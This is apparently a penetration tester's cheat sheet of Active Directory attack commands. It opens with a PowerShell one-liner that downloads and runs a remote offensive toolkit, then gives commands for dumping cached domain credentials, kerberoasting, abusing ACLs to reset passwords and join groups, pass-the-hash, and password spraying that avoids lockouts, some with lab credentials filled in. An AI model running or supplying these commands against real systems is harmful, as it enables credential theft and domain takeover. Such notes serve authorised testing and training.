iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1')
PowerSharpPack -Tokenvator -Command "getsystem powershell.exe"
```

List of testing tools
```
arsenal
```


## secretsdump.py Dump mscash - Cached Domain Credentials

> Source: `01101100-C0D3X-00110110.md` → `Impacket > secretsdump.py Dump mscash - Cached Domain Credentials`

```
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```


## lookupsid.py lookupsid Get DomainSID

> Source: `01101100-C0D3X-00110110.md` → `Impacket > lookupsid.py lookupsid Get DomainSID`

```
impacket-lookupsid -domain-sids <domain>/'<username>':'<password>'@<dc_host> 0
```


## impacket add a computer

> Source: `01101100-C0D3X-00110110.md` → `Impacket > impacket add a computer`

```
addcomputer.py -computer-name '<computername>$' -computer-pass '<computer_password>' -dc-host <dc_ip> '<domain>/<username>:>user_password'
```


## PowerView

> Source: `01101100-C0D3X-00110110.md` → `PowerView`

https://powersploit.readthedocs.io/en/stable/Recon/README/


## Recon Get Default Domain Policy

> Source: `01101100-C0D3X-00110110.md` → `PowerView > Recon Get Default Domain Policy`

```cmd
powershell -ep bypass
. .\PowerView.ps1
Get-GPO -Name "Default Domain Policy"

# Use the Guid (ID) to see what we can do with our user
Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName <our user>

# If you can GPO Edit, Modify, or Delete... Use SharpGPOAbuse!
```


## Recon Get Groups

> Source: `01101100-C0D3X-00110110.md` → `PowerView > Recon Get Groups`

```
Get-DomainGroup -domain <domain> | select samaccountname
```


## Recon Get GroupMembers

> Source: `01101100-C0D3X-00110110.md` → `PowerView > Recon Get GroupMembers`

```
Get-DomainGroupMember -domain <domain> -Identity <identity> | select MemberName
```


## Recon Find groups's ACEs on current user

> Source: `01101100-C0D3X-00110110.md` → `PowerView > Recon Find groups's ACEs on current user`

```
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} | select Identity, ObjectDN, AceType, ActiveDirectoryRights
```


## Recon Find user's ACEs on current user

> Source: `01101100-C0D3X-00110110.md` → `PowerView > Recon Find user's ACEs on current user`

```
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} | select Identity, ObjectDN, AceType, ActiveDirectoryRights
```


## Recon Find computer's ACEs on current user

> Source: `01101100-C0D3X-00110110.md` → `PowerView > Recon Find computer's ACEs on current user`

```
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} | select Identity, ObjectDN, AceType, ActiveDirectoryRights
```


## Recon Get SPN

> Source: `01101100-C0D3X-00110110.md` → `PowerView > Recon Get SPN`

```
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat
```


## PowerView Add user to domain group

> Source: `01101100-C0D3X-00110110.md` → `PowerView > PowerView Add user to domain group`

```
Add-DomainGroupMember -Identity '<groupname>' -Members '<username>'
```


## PowerView Set SPN

> Source: `01101100-C0D3X-00110110.md` → `PowerView > PowerView Set SPN`

```
Set-DomainObject -Credential $creds -Identity <account> -Set @{serviceprincipalname="fake/NOTHING"}
```


## ACEs ForceChangePassword (PowerView)

> Source: `01101100-C0D3X-00110110.md` → `PowerView > ACEs ForceChangePassword (PowerView)`

```
Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force) -Verbose
```


## ACEs ForceChangePassword (On Kali, with password)

> Source: `01101100-C0D3X-00110110.md` → `PowerView > ACEs ForceChangePassword (On Kali, with password)`

https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword
```
net rpc password <TargetUser> -U <domain>/<ControlledUser>%<Password> -S <DC>
```


## Add User to a group

> Source: `01101100-C0D3X-00110110.md` → `PowerView > Add User to a group`

```bash
bloodyAD -u 'alfred' -p 'basketball' -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember Infrastructure alfred
```


## Reset Users password

> Source: `01101100-C0D3X-00110110.md` → `PowerView > Reset Users password`

```bash
bloodyAD --host $IP -d tombwatcher.htb -u 'ansible_dev$' -p :1c37d00093dc2a5f25176bf2d474afdc set password 'SAM' 'newP@ssword2022'
```


## ACEs ForceChangePassword (On Kali, with hash)

> Source: `01101100-C0D3X-00110110.md` → `PowerView > ACEs ForceChangePassword (On Kali, with hash)`

```
pth-net rpc password <TargetUser> -U <domain>/<ControlledUser>%ffffffffffffffffffffffffffffffff:<nthash> -S <DC>
```


## ACEs add Rights

> Source: `01101100-C0D3X-00110110.md` → `PowerView > ACEs ForceChangePassword (On Kali, with hash) > ACEs add Rights`

```
Add-DomainObjectAcl -TargetIdentity <GroupName> -PrincipalIdentity <Account> -Rights All
```


## Netexec

> Source: `01101100-C0D3X-00110110.md` → `Netexec`

**IF LOCAL**
```bash
nxc rdp 192.168.243.191 -u 'dmzadmin' -p 'SlimGodhoodMope' --local-auth
```


## AVOID LOCKOUTS

> Source: `01101100-C0D3X-00110110.md` → `Netexec > AVOID LOCKOUTS`

```
nxc rdp targets.txt -u users.txt -p pass.txt --ufail-limit 3 --gfail-limit 10 --continue-on-success
```


## check machine account quota

> Source: `01101100-C0D3X-00110110.md` → `Netexec > check machine account quota`

```
nxc ldap <target> -u <username> -p <password> -d <domain> -M MAQ
```
